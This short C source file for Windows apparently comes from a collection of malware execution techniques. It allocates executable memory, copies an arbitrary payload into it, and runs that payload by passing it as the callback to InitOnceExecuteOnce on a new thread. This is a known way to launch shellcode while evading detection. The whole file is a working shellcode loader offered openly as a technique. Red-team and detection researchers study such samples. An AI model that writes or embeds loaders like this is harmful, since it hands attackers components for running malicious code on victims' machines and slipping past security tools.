#include "Win32Helper.h"

VOID InvokeInitOnceExecuteOnceCallbackRoutine(LPVOID lpParameter)
{
	INIT_ONCE InitOnce = INIT_ONCE_STATIC_INIT;
	PVOID Context;

	InitOnceExecuteOnce(&InitOnce, (PINIT_ONCE_FN)lpParameter, NULL, &Context);
}

BOOL MpfSceViaInitOnceExecuteOnce(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeInitOnceExecuteOnceCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}